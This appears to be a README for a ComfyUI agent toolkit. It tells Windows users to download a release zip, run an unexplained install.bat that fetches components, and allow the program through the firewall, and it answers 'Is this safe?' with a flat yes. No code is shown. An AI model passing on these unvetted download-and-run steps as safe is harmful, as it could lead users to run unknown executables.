# 🛠️ ComfyUI-Agent-Kit - Control AI workflows with simple commands

[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Steam9303/ComfyUI-Agent-Kit/releases)

ComfyUI-Agent-Kit connects your coding agent to powerful image and video generation tools. You use your preferred AI coding tool to trigger workflows in ComfyUI. This kit includes 66 prompt recipes and 534 templates. It helps you manage complex projects involving image generation, video creation, and ControlNet.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit this [official release page](https://github.com/Steam9303/ComfyUI-Agent-Kit/releases) to download the latest version.
2. Look for the file ending in .zip under the Assets section.
3. Save the file to your computer.
4. Right-click the file and choose Extract All.
5. Choose a folder on your machine to hold these files.

## ⚙️ System Requirements

Your computer needs specific parts to run these tools. Ensure your machine meets these marks for a smooth experience:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 16GB of RAM is necessary.
- Graphics Card: An NVIDIA GPU with at least 8GB of video memory is recommended.
- Storage: 10GB of free space.
- Software: You must have Python 3.10 or newer installed.

## 🚀 Installation Process

The kit includes a setup script to simplify the process.

1. Open the folder you extracted earlier.
2. Find the file named install.bat.
3. Double-click this file to start the installation.
4. A window will appear. It will download the necessary components for your AI agent.
5. Wait for the process to finish. When the window closes, your setup is ready.

## 💻 Running the Application

Once you install the requirements, you can start the service.

1. Double-click the file named start.bat in the main folder.
2. The system confirms when it is ready.
3. Open your browser and go to http://localhost:8188.
4. You now see the ComfyUI interface.

## 📖 Using Your AI Agent

The kit works with tools like Claude Code, Gemini CLI, and Qwen Code. You do not need deep coding skills to link your agent.

1. Open your chosen coding agent in your terminal.
2. Ask your agent to connect to the local address provided during startup.
3. Use the templates provided to request specific tasks. For example, ask the agent to apply a style or generate a video sequence.
4. The agent handles the instructions and triggers the local ComfyUI workflow.

## 🔍 Frequently Asked Questions

What if the application fails to start?
Check your graphics card drivers. Ensure they are up to date. Verify that no other program uses port 8188.

Can I add my own templates?
Yes. Place your template files in the folders labeled templates within the main directory.

Does it support video?
Yes. The kit includes specific workflows for multi-shot video generation.

Is this safe to run locally?
Yes. The kit runs entirely on your own hardware. Your data stays on your computer.

## 🔧 Troubleshooting

If you see errors, review the log file in the logs folder. This file contains text that explains why a process failed. Common errors relate to missing steps in the installation file. Try running the setup script again if you experience crashes. 

For better performance, close other programs while you run the agent. Graphics cards use their full power when creating images. High heat is normal. Use a well-ventilated area for your computer. 

If your agent fails to connect, check your firewall. Windows might ask for permission to allow the application through. Choose Allow to let the agent talk to the browser. 

The software includes 534 templates. Browse these to see which workflows suit your needs. Each template contains notes on how to best use it for your project. Keep your prompts simple. The agent learns from your input and gets better as you provide more details.
